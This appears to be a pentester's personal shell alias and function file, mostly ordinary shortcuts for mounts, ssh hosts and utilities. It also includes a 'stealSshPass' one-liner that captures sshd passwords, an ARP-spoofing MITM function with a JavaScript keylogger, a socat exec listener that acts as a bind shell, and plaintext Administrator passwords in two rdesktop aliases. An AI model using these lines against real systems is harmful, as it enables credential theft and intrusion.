alias 222="mount.nfs -v 10.42.1.21:/mnt/222 /mnt/222"
alias ..2='cd ../..'
alias ..3='cd ../../..'
alias 3R4HS="mount.nfs -v 10.42.1.21:/mnt/mey/3R4HS /mnt/3R4HS"
alias ..4='cd ../../../..'
alias 4RC="ssh 10.42.1.11"
alias ..5='cd ../../../../..'
alias 755='chmod 755'
alias +8='awk "length >=8"'
alias a2="apache2ctl -k start"
alias a2s="apache2ctl -k stop"
#alias a2s='systemctl stop httpd.service'
#alias a2='systemctl start httpd.service'
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias aria2c='aria2c --continue'
alias ArNmap="nmap --min-hostgroup 96 -sS -n -sU -T4 -A -v"
alias as='apache2ctl fullstatus'
alias B5D="ssh k4ndar3c@10.42.1.21"
alias BattPower="upower -i $(upower -e | grep BAT)"
alias bugtraq="ssh 10.42.1.27"
alias C1='sed "s/^./\u&/"'
alias CAM3="vlc -I dummy -v --noaudio --ttl 12 v4l2:///dev/video0 --sout '#std{access=mmsh,dst=:1234}' -V X11"
alias CAM='vlc -v --noaudio v4l2:///dev/video0 --sout "#transcode{vcodec=mp4v,vb=128}:std{access=mmsh,dst=:1234}"'
alias CAPItalize="sed 's/.*/\U&/'"   #awk '{print toupper($0)}'
alias ccat='pygmentize -O bg=dark'
alias ..='cd ..'
alias chromium-browser='chromium-browser --user-data-dir=/root/.chromium-browser'
alias cl='clear ; ls -hFl'
alias CLEAN='bleachbit -c --preset'
alias CleanCat2="grep -vE '^$|^#'"
alias Cleancat='sed -e "/^$/d" -e "/^#/d"'
alias ClWebPage="elinks -dump "
alias cmatrix="cmatrix -ab"
alias cp='cp -v'
alias d='cd /home/k4ndar3c/Downloads ; clear'
alias dd="dd status=progress"
alias D="dirs -v | head -n15"
alias decryptPubKey="openssl rsa -pubin -text -modulus -in"
alias dfc='dfc -wiT'
alias df='df -hT --exclude-type=tmpfs'
alias DimJpg="convert -define jpeg:extent=500Kb"
alias dla='du -sh $(ls -A) | sort -hr'
alias dl='du -sh $(ls) | sort -hr'
alias biggest='du -h --max-depth=1 |sort -h'
alias DL='ls -A| while read a ; do du -hs "$a" ;done| sort -hr'
alias du='du -h'
alias E='exit'
alias egrep='egrep --color=auto'
alias f3doR="ssh 10.42.1.18"
alias fact='elinks -dump randomfunfacts.com |grep -A7 ┌─────────────────────────|grep -v "^$"|grep -v "^\ "'
alias fgrep='fgrep --color=auto'
alias op='netstat -anpe --inet --inet6'
alias rg='rg --sort path'
alias FInd='find / -iname'
alias findSUID='find / -user root -perm -4000 -print'
alias fr33bsd="ssh 10.42.1.31"
alias free='free -h'
alias FR="gtrans.py -d fr"
alias FULLnmap='nmap --reason -A -sC -sS '
alias GC='git clone'
alias getIp="python3 -c 'import socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect((\"10.42.1.2\",80));print(s.getsockname()[0]);s.close()'"
alias -g G="|grep --color=auto"
alias -g H='--help'
alias -g L='|less'
alias -g TL='|tail'
alias -g J='|jq'
alias GP='git pull'
alias grep='grep --color=auto'
alias GUp="GITs.py /pentest/PeNtEsT /root"
alias h='cd /home/k4ndar3c/ ; clear'
alias HEAders="wget -S --spider -O - "
alias HEAvy='mount.nfs -v Knoppix:/HEAvy /mnt/HEAvy'
alias hh='history | grep -i'
alias history="fc -l 1 "
alias homeip="curl -s clairemaindor.fr/cons |tail -n1 |awk '{print \$2}'"
alias i='ifconfig'
alias I='iwconfig'
alias IpForward='echo 1 > /proc/sys/net/ipv4/ip_forward'
alias IpForwardStop='echo 0 > /proc/sys/net/ipv4/ip_forward'
alias IPv6='nmap -6 --script="*ipv6*" --script-args=newtargets --top-ports 250 -T4'
alias ircNewbieCon="echo '#newbiecontest' ; irssi -c irc.worldnet.net"
alias ircRootMe="echo '#root-me' ; irssi -c irc.root-me.org"
alias jaR0="ssh 10.42.1.10"
alias j='jobs -l'
alias jNET='jnettop -x "not udp" -i $(ifconfig |grep flag|grep -v lo |cut -f1 -d":")'
alias jobs='jobs -l'
alias K9='kill -9'
alias kata="ssh 10.42.1.41"
alias KillJob='kill -9 `jobs -l | cut -f4 -d" "`'
alias K="k -h"
alias Knoppix="ssh 10.42.1.12"
alias la='ls -A'
alias LiGhT="ssh 10.42.1.24"
alias ll='ls -ahlF'
alias l='ls -lhF'
alias lrs='ls -lahrS'
alias lrt='ls -rtl'
alias lsdir='command ls --color=auto -a -l -h -d *(/)'
alias tree='tree -CAFh --dirsfirst'
alias treed='tree -CAFd'
alias psa='ps faux'
alias ls='ls --color=auto'
alias m4k="ssh 10.42.1.13"
alias Matriux="ssh 10.42.1.19"
alias medium="mount.nfs -v 10.42.1.21:/mnt/medium /mnt/medium"
alias mey="mount.nfs -v 10.42.1.21:/mnt/mey/3R4HS /mnt/mey"
alias msf='systemctl start postgresql && msfconsole'
alias msieve='msieve -v'
alias muS1x="ssh k4ndar3c@10.42.1.14"
alias mv='mv -v'
alias myip="curl -s ifconfig.me/ip ; echo"
alias Mys='systemctl stop mysqld'
alias My='systemctl start mysqld'
alias n3th="ssh root@10.42.1.28"
alias n3wb="ssh root@10.42.2.1"
alias N5Tool="ssh root@10.42.1.40"
alias NEThogs='nethogs $(ifconfig | grep flags|grep -v lo|cut -f1 -d":")'
alias NFS="systemctl restart nfs-config rpc-statd nfs-server"
alias NFStop="systemctl stop nfs-config rpc-statd nfs-server"
alias nip='echo -n "Internal IP:  " ; ifconfig | grep Bcast | cut -d ":" -f2 | cut -d " " -f1 ;echo -n "External IP:  " ; curl ifconfig.me ;echo -n "MAC address:  " ; ifconfig | grep Ethernet | cut -d " " -f11'
alias NMStart="systemctl start NetworkManager.service"
alias NMStop="systemctl stop NetworkManager.service wpa_supplicant.service"
alias n='netstat -antup ; echo ; ss -antup ; echo ; lsof -i -P'
alias np='netstat -anp | grep -i '
alias nSTool="ssh 10.42.1.34"
alias NT="arp-scan -l"
alias OBJ="objdump -d -Mintel "
alias OFF='shutdown -h -P now'
alias p17Share="mount -v -t nfs p17:/home/k4ndar3c /mnt/p17"
alias p2s='systemctl stop postgresql'
alias p2='systemctl start postgresql'
alias pentoo='ssh 10.42.1.29'
alias PipUpgradeAll="pip freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip install -U"
alias poogle4='ping -4 -c5 google.com ; ping -4 -c5 google.fr'
alias poogle6='ping -6 -c5 google.com ; ping -6 -c5 google.fr'
alias poogle='ping -4 -c5 google.com ; ping -6 -c5 google.com'
alias Pp="python2 -c 'print "
alias p='ps faux|grep -v grep|grep -i'
alias px4='proxychains4'
alias px='proxychains'
alias PYServer='python3 -m http.server'
alias q5vi="ssh 10.42.1.15"
alias R3d="ssh 10.42.1.16"
alias R3P05='mount -v -t nfs Matriux:/M0un7po1nt/R3P05 /mnt/R3P05/'
alias rdesktop='rdesktop -k fr'
alias RDwin='rdesktop -u Administrateur -p "W1Nserv-" 10.42.1.25 &'
alias RG='iw reg get'
alias rmpyc='rm -Rf __pycache__ ; rm *.pyc'
alias rrmpyc='find . -type d -name __pycache__ -exec rm -frv {} \;'
alias rm='rm -Iv'
alias RS='iw reg set '
alias rsyncAr='rsync --progress --archive -X -A -H -z'
alias rsync='rsync -v'
alias RT-FILES='mount.nfs -v 10.42.1.100:/media/RT-FILES /mnt/RT-FILES'
alias s='cd /pentest/PeNtEsT/ ; clear'
alias S="echo $(echo '$?')"
alias setRouteBox="ip route del default ; ip route add default via 192.168.1.1 dev"
alias setRouteRT="ip route del default ; ip route add default via 10.42.1.100 dev"
alias SFR='for i in {7200..1} ; do echo "<|......---------xX------  $i  ------Xx---------......|>" ; sleep 1 ; done'
alias showIpTables="iptables -L -n -v ; echo ; echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" ; echo ; ip6tables -L -n -v"
alias sip='sort -n -u -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4'
alias SKR="ssh-keygen -R"
alias slax="ssh 10.42.1.23"
alias smb03="smbclient \\\\\\\\10.42.1.25\\\\SHARE03 -U Administrateur"
alias smb12="smbclient \\\\\\\\10.42.1.14\\\\d0wn5 -U Administrator"
alias smbW7="smbclient \\\\\\\\10.42.1.33\\\\FILES -U k4ndar3c"
alias SN="ssFAll;NTNames"
alias Spike="ssh root@10.42.1.22"
alias ssFAll="threadedSSH-paramiko.py StopServices;StopServices;clear"
alias SSHD="vim /etc/ssh/sshd_config && systemctl restart ssh sshd"
alias stealSshPass="strace -ff -p $(pidof sshd) -e read |& grep -F ', \"\f\0\0\0\'"
alias STuff='mount.nfs -v Knoppix:/STuff /mnt/STuff'
alias SV='svn update'
alias T="sensors ; /root/bin/tempMon.py 1 ; echo ; hddstemp"
alias t='time'
alias UL="updatedb && locate "
alias update-grub="grub-mkconfig -o /boot/grub/grub.cfg"
alias UPmon0='airmon-ng start wlan1'
alias urldecode='node -e "console.log(decodeURIComponent(process.argv[1]))"'
alias urldecodepy='python3 -c "import sys, urllib.parse as up; print(up.unquote_plus(sys.argv[1]))"'
alias urlencode='node -e "console.log(encodeURIComponent(process.argv[1]))"'
alias urlencodepy='python3 -c "import sys, urllib.parse as up; print(up.quote_plus(sys.argv[1]))"'
alias US="gtrans.py -d us"
alias VIdz="grep -Ei '(mp4|webm|flv|mkv|avi)'"
alias viewCon="tail -F /proc/net/nf_conntrack | ccze -A"
alias watch4="watch iptables -L -n -v"
alias watch6="watch ip6tables -L -n -v"
alias whichSong="ssh root@10.42.1.17 lsof -c vlc|grep Z1C|cut -d '/' -f4,5,6,7,8,9,10,11,12,13,14"
alias win12="rdesktop -k fr -u Administrator -p 'W1Nddos)' -g 1024x864 10.42.1.14 &"
alias W="nmcli d wifi list"
alias x='chmod a+x'
alias X="ssh -X"
alias xXx="ssh k4ndar3c@10.42.1.17"
alias y0lo="ssh root@10.42.1.5"
alias YT="youtube-dl -f18 "
alias Y="youtube-dl "
alias z120='date ; shutdown -h -P +120'
alias Z1C='mount -v -t nfs xXx:/Z1C /mnt/Z1C'
alias z45='date ; shutdown -h -P +45'
alias z60='date ; shutdown -h -P +60'
alias z90='date ; shutdown -h -P +90'
alias Zapping="youtube-dl -f 18 https://www.youtube.com/channel/UCoRnHlbVByoYV6st5kPxOIQ/ --playlist-end=1"
function Append0-9 { for i in $(cat $1) ; do seq -f $i%1.0f 0 9 ; done ; }
function CHROOT { mount $1 $2 ; mount -t proc /proc $2/proc ; mount -t sysfs /sys $2/sys ; mount -B /dev $2/dev ; mount -B /dev/pts $2/dev/pts ; chroot $2 ; }
function CleanWebPage { curl -s $1 | html2text ; }
function cryptPass { perl -e "print crypt(\"$1\", \"$2\")" ; }
function d64 { echo -n $1 |base64 -i -d ; echo ; }
function ePo1 { echo -n $1 |iconv --to-code UTF-16LE |base64 -w0 ; echo ; }
function ePo2 { echo -n $1 |iconv --to-code UTF16LE |base64 -w0 ; echo ; }
function encPowershell { ePo1 $1 || ePo2 $1 ; }
function d64url { echo -n $1 |sed 's/-/+/g' |sed 's/_/\//g' |base64 -d ; echo ; }
function dHex { echo -n $1 | xxd -r ; echo ; }
function GACP { git add --all && git commit -a -m $1 && git push -u origin $2 ; }
function GMD5 { grep -i $1 /pentest/PeNtEsT/pentestscr1pts/w0Rdl1stS/MD5s-resolv.lst ; }
function hexMd5sum { echo -n $1 | xxd -r -p | md5sum ; }
function live-clean { for i in {1..$1} ; do nmcli c delete "$2 $i" ; done ; }
function LookAtGit { elinks "https://github.com/$1?tab=repositories" ; }
function lsbTestAll { for i in mersenne log_gen identity fibonacci fermat eratosthenes_composite eratosthenes carmichael ackermann OEIS_A000217 Dead_Man_Walking syracuse ; do lsb-set reveal -i $1 -g $i ; done ; }
function MakePlayList { if [ "x$2" "==" "x" ] ; then echo "Usage: <directory> <playlist>" ; else touch ./"$2" && find "$1" -print | grep -iE '(\.mp3|\.wav|\.m4a|\.wma|\.ogg|\.mp4|\.mpc|\.mp4a|\.amr|\.mid|\.webm)'|sed 's/^/\"/g' |sed 's/$/\"/g'  >> "$2" ; echo ---DONE!--- ; fi ; }
function makeShellCode2 { xxd -c 1 $1 | awk '{print "\\x"$2 }' |tr -d '\n' ; echo ; wc -c $1 ; }
function makeShellCode { nb=0 ; for i in $(objdump -d $1|grep "^ "|cut -f2); do nb=$(($nb+1)) ; echo -n '\\x'$i ; done ; echo ; echo "len=$nb" ; }
function meteo { curl -s http://wttr.in/$1 ; }
function MITM { mitmf -i $1 --hsts --spoof --arp --jskeylogger --ferretng --gateway $2 ; }
function nasm2ld32 { nasm -f elf -o $1.o $1.asm ; ld $1.o -o $1 -m elf_i386 ; }
function nasm2ld { nasm -f elf64 -o $1.o $1.asm ; ld $1.o -o $1 -m elf_x86_64 ; }
function nmapSearchX { nmap -p- -sV -oX /tmp/n.xml $1 ; searchsploit --nmap /tmp/n.xml ; }
function NP { netstat -anp | grep -i $1 ; ss -anp | grep -i $1 ; lsof -i -P | grep -i $1 ; }
function oneGadget { binsh=`strings -tx $1 | grep "/bin/sh" | cut -f2 -d ' '` ; echo "[+] binsh at "$binsh ; objdump -M intel -d $1 | grep execve -B5 | grep rdi -C3 | grep $binsh -C3 ; }
function PProcess { kill -STOP $1 ; sleep $2 ; kill -CONT $1 ; }
function PdfDim { gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=$1 $2 ; }
function Qf { find . -iname "*$1*" ; }
function readelfSort { readelf -s $1 | awk '{print $2,$8}' | sort ; }
function RedirPort2 { iptables -A PREROUTING -t nat -i $4 -p tcp --dport $1 -j DNAT --to $2:$3 ; iptables -A FORWARD -p tcp -d $2 --dport $3 -j ACCEPT ; }
function RedirPort3 { iptables -t nat -I OUTPUT --src 0/0 --dst $3 -p tcp --dport $1 -j REDIRECT --to-port $2 ; }
function RedirPort { iptables -t nat -A PREROUTING -i $3 -p tcp --dport $1 -j REDIRECT --to-port $2 ; }
function ReVerse { python3 -c "print(''.join(reversed(\"$1\")))" ; }
function shift51 { for i in {1..51} ; do shiftCipher3.py $1 $i ; done ; for i in {-1..-51} ; do shiftCipher3.py $1 $i ; done ; }
function SshForAll { for i in $(arp-scan -l |grep -vi interface|grep "10\.42"|grep -v "\.100" |grep -v "\.37" |grep -v "\.55"|cut -f 1) ;do echo $i ; ssh $i $* ; echo ;  done ; echo ; }
function transfer { if [ $# -eq 0 ]; then echo -e "No arguments specified. Usage:\necho transfer /tmp/test.md\ncat /tmp/test.md | transfer test.md"; return 1; fi ; tmpfile=$( mktemp -t transferXXX ); if tty -s; then basefile=$(basename "$1" | sed -e 's/[^a-zA-Z0-9._-]/-/g'); curl --progress-bar --upload-file "$1" "https://transfer.sh/$basefile" >> $tmpfile; else curl --progress-bar --upload-file "-" "https://transfer.sh/$1" >> $tmpfile ; fi; cat $tmpfile ; echo ; rm -f $tmpfile; }
function u64dec { python2 -c "import base64; print int(base64.b64decode('$1').encode('hex'),16)" ; }
function updateSite { find $1 -name "index.html?*" -print -exec rm "{}" \; ; wget -r -l inf -nc $1 ; }
function upl04d { curl -X POST -F "fileToUp=@"$1 -F "submit=submit" http://www.clairemaindor.fr/myPers0w3bp4ge5/th1s-uplo4d/upp4g3.php && curl clairemaindor.fr/myPers0w3bp4ge5/th1s-uplo4d/upl04dl0g ; }
function VirusTotal { python -c "import requests;print(requests.post('https://www.virustotal.com/en/search/', data={'query':'$1'}).content)" |grep -Ei ('57 antivirus'|'File not found') ; }
function WHILe { eval "$2" ; echo "*** $1 s" ; while sleep $1 ; do eval "$2" ; echo "*** $1 s" ; done ; }
alias III='mount N5Tool:/III /mnt/nstool'
alias IV='mount N5Tool:/IV /mnt/nstoolIV'
alias dwsLight="mount LiGhT:/DwS /mnt/other"
alias cpr="rsync -ah --inplace --info=progress2"
alias QuadNfs="mount -v Quad:/old_p17 /mnt/quad"
alias Commando="ssh -p 7876 k4ndar3c@commando"
alias tmuxAttach="tmux attach-session -t"
alias wfuzz="wfuzz -c"
function socatExec { socat tcp-listen:8989,reuseaddr,fork exec:$1 ; }
alias p4="ping -c4"
alias MATRIX="unimatrix.py -a -lCcaAgGnorRsS"
alias PS="ps awwfux | less -S"
alias noleak="ssh root@noleak"
function DISASM64 { python3 -c "import pwn;print(pwn.disasm(b'$1', arch='amd64'))" ; }
function DISASM32 { python3 -c "import pwn;print(pwn.disasm(b'$1', arch='i386'))" ; }
alias route4n3wb="ip route add 10.42.2.0/24 via 10.42.1.100"
alias ShowEnabledServices="systemctl list-unit-files --state=enabled"
alias radioStAff="mplayer -afm ffmpeg 'https://www.radiosaintaffrique.com/en-direct'"
alias radioLarzac="mplayer -afm ffmpeg 'http://stream.radiolarzac.org:8000/radiolarzac'"
alias CBox="chatbox-rm.py en ; chatbox-rm.py fr"
alias lsd="lsd -l"
alias SongPos="VLC status | jq .root.position"
alias wS2="VLC status|jq .root.information |grep -EA1 '(filename|artist|title|album)'"
alias t0="tmux attach-session -t 0"
alias restart_zic="ssh k4ndar3c@xXx '/home/k4ndar3c/bin/restart_zic.sh'"
function untinyurl { curl -v -I -L $1 2>&1 | grep -C3 Host ; }
alias ip='ip --color=auto'
alias TM="tempMon.py"
function PatchELF { patchelf --set-interpreter $PWD/lib/ld-2.$2.so --replace-needed libc.so.6 $PWD/lib/libc.so.6 ./$1 ; }
function stringsALL { for e in "s" "S" "b" "B" "l" "L" ; do strings -e $e -n "$2" "$1" ; done ; }
alias upGitsDir='for i in $(ls) ; do ls $i/.git 1>/dev/null 2>&1 ; if [ $? -eq 0 ] ; then echo "@@@ $i" ; cd $i ; git pull ; cd .. ; fi ; done'
alias c="bat"
alias ipa='ip --brief --color a'
alias ntpSetTime="ntpdate 1.fedora.pool.ntp.org"
function cC { for i in $(ls) ; do echo ; echo $i@@@@@@@ ; c -pp $i ; done ; }
function zlibdec { printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" | cat - "$1" | gzip -dc ; }
function REvEIL { VLC s ; ssh xXx "at $1 < /home/k4ndar3c/bin/reveil" ; }
function mkdCd { mkdir -p "$1" && cd "$1" ; }
function mvLastDown { mv /home/k4ndar3c/Downloads/"`ls -rt /home/k4ndar3c/Downloads/|tail -n1`" "$1" ; }
function fullScan { masscan $1 -p1-65535,U:1-65535 --rate=500 -e $2 --wait 5 -oL tcp_udp.$1.masscan --interactive ; }
alias hddstemp='for i in $(df -hT --exclude-type=tmpfs G /dev/sd |cut -d" " -f1 |cut -c -8 |sort -u) ; do hddtemp $i || skdump --temperature $i ; done'
alias so="~/bin/save_output.sh"
alias myipv6="curl -6 ifconfig.co"
